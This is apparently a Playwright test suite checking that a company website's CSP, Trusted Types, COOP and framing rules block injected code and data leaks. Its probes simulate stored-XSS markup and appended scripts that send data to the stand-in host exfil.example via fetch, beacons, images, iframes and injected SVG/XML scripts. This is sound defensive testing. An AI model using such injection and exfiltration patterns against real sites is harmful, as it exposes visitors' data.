import { expect, test, type Page } from '@playwright/test';

// A policy string alone cannot prove that a browser refuses injected code.
// These harmless probes never send data or touch browser storage.
//
// Each probe arrives the way an attack would: as markup injected into the
// served HTML, or as extra code inside a script the policy lets run (our own
// main.js standing in for a compromised dependency). Trusted Types refuses
// the DOM's own ways of injecting a script, so the probes cannot add one.

/** Stub Turnstile, and append `probe` to the site's own main.js. */
async function compromiseMainJs(page: Page, probe: string) {
  await page.route('**/challenges.cloudflare.com/**', (route) => route.fulfill({
    contentType: 'text/javascript',
    body: 'window.turnstile={getResponse:()=>"journey-token",reset(){},render(){}};',
  }));
  await page.route('**/assets/js/main.js*', async (route) => {
    const original = await route.fetch();
    await route.fulfill({ response: original, body: `${await original.text()}\n;${probe}` });
  });
}

/** Collect every CSP violation from the first byte, outside the page's policy. */
async function recordViolations(page: Page) {
  await page.addInitScript(() => {
    const seen: string[] = [];
    document.addEventListener('securitypolicyviolation', (event) => {
      seen.push(`${event.effectiveDirective} ${event.blockedURI}`);
    });
    Object.defineProperty(window, '__violations', { value: seen });
  });
  return () => page.evaluate(() => (window as unknown as { __violations: string[] }).__violations);
}

// Writes a string into each DOM sink that turns text into HTML or code and
// records, per sink, whether the browser allowed it or what it threw. Nothing
// written is attached to the document, so a sink that is allowed changes nothing.
const SINK_PROBE = `(() => {
  const results = {};
  const attempt = (name, write) => {
    try { write(); results[name] = 'allowed'; } catch (error) { results[name] = error.name; }
  };
  attempt('innerHTML', () => { document.createElement('div').innerHTML = '<a href="/">x</a>'; });
  attempt('outerHTML', () => { const p = document.createElement('p'); document.createElement('div').append(p); p.outerHTML = '<p>x</p>'; });
  attempt('insertAdjacentHTML', () => { document.createElement('div').insertAdjacentHTML('beforeend', '<form></form>'); });
  attempt('DOMParser', () => { new DOMParser().parseFromString('<p>x</p>', 'text/html'); });
  attempt('createContextualFragment', () => { document.createRange().createContextualFragment('<p>x</p>'); });
  attempt('iframe srcdoc', () => { document.createElement('iframe').srcdoc = '<p>x</p>'; });
  attempt('script src', () => { document.createElement('script').src = '/csp-probe.js'; });
  attempt('script text', () => { document.createElement('script').textContent = 'void 0'; });
  attempt('event handler attribute', () => { document.createElement('button').setAttribute('onclick', 'void 0'); });
  attempt('new policy', () => { trustedTypes.createPolicy('probe', { createHTML: (s) => s }); });
  try { Function('document.documentElement.dataset.probeEval = "ran"')(); } catch {}
  document.documentElement.dataset.sinkProbe = JSON.stringify(results);
})();`;

const REFUSED = {
  innerHTML: 'TypeError',
  outerHTML: 'TypeError',
  insertAdjacentHTML: 'TypeError',
  DOMParser: 'TypeError',
  createContextualFragment: 'TypeError',
  'iframe srcdoc': 'TypeError',
  'script src': 'TypeError',
  'script text': 'TypeError',
  'event handler attribute': 'TypeError',
  'new policy': 'TypeError',
};

test('pages refuse unapproved scripts, event handlers, eval and HTML strings', async ({ page }) => {
  await compromiseMainJs(page, SINK_PROBE);
  const violations = await recordViolations(page);
  // Stored-XSS stand-in: markup injected into the HTML as it is served.
  await page.route('**/*', async (route) => {
    if (route.request().resourceType() !== 'document') return route.fallback();
    const original = await route.fetch();
    const body = (await original.text()).replace(/<meta http-equiv="refresh"[^>]*>/i, '');
    const injection = [
      '<script>document.documentElement.dataset.probeInline="ran"</script>',
      '<img alt="" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="document.documentElement.dataset.probeHandler=\'ran\'">',
    ].join('');
    const html = body.includes('</body>') ? body.replace('</body>', `${injection}</body>`) : `${body}${injection}`;
    await route.fulfill({ response: original, body: html });
  });

  for (const path of ['/', '/contact/', '/field-notes/', '/services.html/index.html', '/no-such-page-security/']) {
    await page.goto(path);
    // A legacy redirect stub 301s to its page through the edge Worker, so only
    // assert the DOM-sink probe when main.js ran on the landed page.
    const hasMain = (await page.locator('script[src*="/assets/js/main.js"]').count()) > 0;
    if (hasMain) await expect(page.locator('html')).toHaveAttribute('data-sink-probe', /./);
    // Violation events are queued by the browser, after script execution.
    await page.waitForTimeout(100);
    const result = await page.evaluate(() => ({
      inline: document.documentElement.dataset.probeInline === 'ran',
      handler: document.documentElement.dataset.probeHandler === 'ran',
      eval: document.documentElement.dataset.probeEval === 'ran',
      sinks: document.documentElement.dataset.sinkProbe
        ? (JSON.parse(document.documentElement.dataset.sinkProbe) as Record<string, string>)
        : null,
    }));
    expect(result, path).toEqual({ inline: false, handler: false, eval: false, sinks: hasMain ? REFUSED : null });
    // Eval of a string is a Trusted Types sink too, refused before script-src
    // (which has no 'unsafe-eval' either; tests/csp.test.ts) is consulted.
    const directives = new Set((await violations()).map((v) => v.split(' ')[0]));
    expect([...directives].sort(), path).toEqual(
      hasMain
        ? ['require-trusted-types-for', 'script-src-attr', 'script-src-elem', 'trusted-types']
        : ['img-src', 'script-src-attr', 'script-src-elem'],
    );
  }
});

// /contact/'s one Trusted Types policy loads Turnstile's exact URL and
// nothing else: a script that reaches it cannot load another script with it.
test('the contact page can load only the Turnstile script', async ({ page }) => {
  await compromiseMainJs(page, `(() => {
    const created = (name) => { try { trustedTypes.createPolicy(name, { createScriptURL: (u) => u }); return 'allowed'; } catch (e) { return e.name; } };
    document.documentElement.dataset.policyProbe = created('turnstile');
  })();`);
  const violations = await recordViolations(page);
  await page.goto('/contact/');
  await page.locator('#contact-form input').first().focus();
  await expect(page.locator('script[src^="https://challenges.cloudflare.com/turnstile/v0/api.js"]')).toHaveCount(1);
  // The page created its policy first, so a second 'turnstile' policy is refused.
  await expect(page.locator('html')).toHaveAttribute('data-policy-probe', 'TypeError');
  expect((await violations()).filter((v) => v.startsWith('require-trusted-types-for'))).toEqual([]);
});

// Even code the policy lets run (our own scripts, a dependency, Turnstile)
// cannot send a visitor's data elsewhere: every way out to another origin is
// refused by the browser before a request is made.
test('pages cannot send data to any other origin', async ({ page }) => {
  const leaked: string[] = [];
  await page.route('**/exfil.example/**', (route) => {
    leaked.push(route.request().url());
    return route.fulfill({ status: 204 });
  });
  await compromiseMainJs(page, `(() => {
    const out = 'https://exfil.example/collect?d=probe';
    fetch(out, { mode: 'no-cors' }).catch(() => {});
    try { navigator.sendBeacon(out, 'probe'); } catch {}
    const img = new Image(); img.src = out + '&via=img';
    const frame = document.createElement('iframe'); frame.src = out + '&via=frame'; document.body.append(frame);
    document.documentElement.dataset.exfilProbe = 'sent';
  })();`);
  const violations = await recordViolations(page);

  for (const path of ['/', '/contact/', '/field-notes/']) {
    await page.goto(path);
    await expect(page.locator('html')).toHaveAttribute('data-exfil-probe', 'sent');
    await page.waitForTimeout(300);
    const refused = (await violations()).filter((v) => v.includes('https://exfil.example')).map((v) => v.split(' ')[0]);
    expect([...new Set(refused)].sort(), path).toEqual(['connect-src', 'frame-src', 'img-src']);
  }
  expect(leaked).toEqual([]);
});

// SVG and XML are active markup formats in browsers when opened directly and
// carry no <meta> tag; the edge Worker stamps default-src 'none' and Trusted
// Types on them (locally too: ops/edge/local.mjs serves dist/ through it).
test('active SVG and XML endpoints refuse injected scripts and outbound requests', async ({ page }) => {
  const leaked: string[] = [];
  await page.route('**/exfil.example/**', (route) => {
    leaked.push(route.request().url());
    return route.fulfill({ status: 204 });
  });
  await page.route('**/*', async (route) => {
    const url = new URL(route.request().url());
    if (url.pathname !== '/assets/images/logo.svg' && url.pathname !== '/field-notes/rss.xml') {
      return route.fallback();
    }
    const original = await route.fetch();
    const text = await original.text();
    const body = url.pathname.endsWith('.svg')
      ? text.replace('</svg>', '<script>document.documentElement.setAttribute("data-ran","1");fetch("https://exfil.example/svg",{mode:"no-cors"}).catch(()=>{})</script></svg>')
      : text.replace('</rss>', '<script xmlns="http://www.w3.org/1999/xhtml">document.documentElement.setAttribute("data-ran","1");fetch("https://exfil.example/xml",{mode:"no-cors"}).catch(()=>{})</script></rss>');
    return route.fulfill({ response: original, body });
  });

  for (const path of ['/assets/images/logo.svg', '/field-notes/rss.xml']) {
    await page.goto(path);
    await page.waitForTimeout(150);
    const ran = await page.evaluate(() => document.documentElement.getAttribute('data-ran'));
    expect(ran, path).toBeNull();
  }
  expect(leaked).toEqual([]);
});

// Every page sends Cross-Origin-Opener-Policy: same-origin (ops/edge/worker.js), so a
// site that opens one in a window gets a closed handle back: it cannot later send that
// window to a look-alike page, message it or count its frames. No response may carry
// NEL, Report-To or Reporting-Endpoints, which would have the browser post reports to
// a server for days after the visit, outside the page's CSP. The headers come from the
// edge Worker, which serves the local run as it serves production.
test('byte-range requests get complete HTML and partial downloads for unchanged files', async ({ request, isMobile }) => {
  test.skip(!isMobile, 'HTTP range handling is independent of viewport');
  const identity = { 'Accept-Encoding': 'identity' };
  const headers = { ...identity, Range: 'bytes=0-63' };

  for (const path of ['/privacy/', '/index%2ehtml']) {
    const full = await request.get(path, { headers: identity });
    expect(full.status(), path).toBe(200);
    const ranged = await request.get(path, { headers });
    expect(ranged.status(), path).toBe(200);
    expect(ranged.headers()['content-range'], path).toBeUndefined();
    expect(ranged.headers()['x-content-type-options'], path).toBe('nosniff');
    expect((await ranged.body()).equals(await full.body()), path).toBe(true);
  }

  const image = await request.get('/og/pages/home.png', { headers });
  expect(image.status()).toBe(206);
  expect(image.headers()['content-range']).toMatch(/^bytes 0-63\/\d+$/);
  const bytes = await image.body();
  expect(bytes.length).toBe(64);
  expect(bytes.subarray(0, 8).toString('hex')).toBe('89504e470d0a1a0a');
});

test('a site that opens a page in a window cannot take it over, and no page asks the browser to report anywhere', async ({ page, context, baseURL }) => {
  await context.route('https://opener.example/**', (route) =>
    route.fulfill({ contentType: 'text/html', body: '<!doctype html><title>another site</title>' }),
  );
  for (const path of ['/', '/contact/']) {
    const response = await page.request.get(new URL(path, baseURL).href);
    for (const name of ['nel', 'report-to', 'reporting-endpoints']) expect(response.headers()[name], `${path} ${name}`).toBeUndefined();

    await page.goto('https://opener.example/');
    const popupEvent = context.waitForEvent('page');
    await page.evaluate((url) => {
      (window as unknown as { victim: Window | null }).victim = window.open(url, 'victim');
    }, new URL(path, baseURL).href);
    const popup = await popupEvent;
    await popup.waitForLoadState('load');
    const handle = await page.evaluate(() => {
      const w = (window as unknown as { victim: Window }).victim;
      try {
        w.location.href = 'https://opener.example/look-alike';
      } catch {
        /* a severed handle may throw or do nothing */
      }
      return { closed: w.closed, frames: w.length };
    });
    expect(handle.closed, `${path}: the opener's handle is closed`).toBe(true);
    await popup.waitForTimeout(500);
    expect(popup.url(), `${path}: the opened page was not sent elsewhere`).toBe(new URL(path, baseURL).href);
    expect(await popup.evaluate(() => window.opener), `${path}: the page cannot reach its opener`).toBeNull();
    await popup.close();
  }
});

// The edge Worker reads the site from its GitHub Pages address, so that address serves every
// page too, without the Worker's frame-ancestors, COOP or nosniff (t23224). Each page's first
// script sends a reader there to the same page on automancer.uk, and a stranger's frame of it
// ends on automancer.uk, which refuses to be framed. Against production the real Pages copy is
// read (deploy.yml publishes it seconds before the journey); otherwise the Pages address serves
// the build under test without the Worker's headers, as Pages does, and automancer.uk is a
// stand-in carrying the Worker's framing rule.
test('the GitHub Pages copy sends readers to automancer.uk and cannot be framed', async ({ page, context, baseURL }) => {
  const PAGES = 'https://automancer-ltd.github.io/automancer-site';
  const production = process.env.JOURNEY_URL === 'https://automancer.uk';
  if (!production) {
    await context.route('https://automancer-ltd.github.io/**', async (route) => {
      const path = new URL(route.request().url()).pathname;
      if (!path.startsWith('/automancer-site/')) return route.fulfill({ status: 404 });
      const copy = await route.fetch({ url: new URL(path.slice('/automancer-site'.length), baseURL).href });
      return route.fulfill({ status: copy.status(), contentType: copy.headers()['content-type'], body: await copy.body() });
    });
    await context.route('https://automancer.uk/**', (route) => route.fulfill({
      contentType: 'text/html',
      headers: { 'content-security-policy': "frame-ancestors 'none'" },
      body: '<!doctype html><title>Services &amp; pricing | Automancer</title><h1>automancer.uk</h1>',
    }));
  }
  await context.route('https://framer.example/**', (route) => route.fulfill({
    contentType: 'text/html',
    body: `<!doctype html><title>another site</title><iframe src="${PAGES}/services/" width="800" height="600"></iframe>`,
  }));

  await page.goto(`${PAGES}/services/?service=workflow-sprint#offers`);
  await page.waitForURL('https://automancer.uk/**');
  expect(page.url()).toBe('https://automancer.uk/services/?service=workflow-sprint#offers');
  await expect(page).toHaveTitle(/^Services .*\| Automancer$/);

  await page.goto('https://framer.example/');
  const frame = page.frames().find((f) => f !== page.mainFrame())!;
  await expect.poll(() => frame.url(), { message: 'the framed copy left github.io' }).not.toContain('github.io');
  // automancer.uk refuses the frame, so nothing of the site is drawn inside it.
  await expect.poll(() => frame.evaluate(() => document.title).catch(() => ''), { message: 'nothing of the site is drawn in the frame' }).not.toMatch(/Automancer/);
});
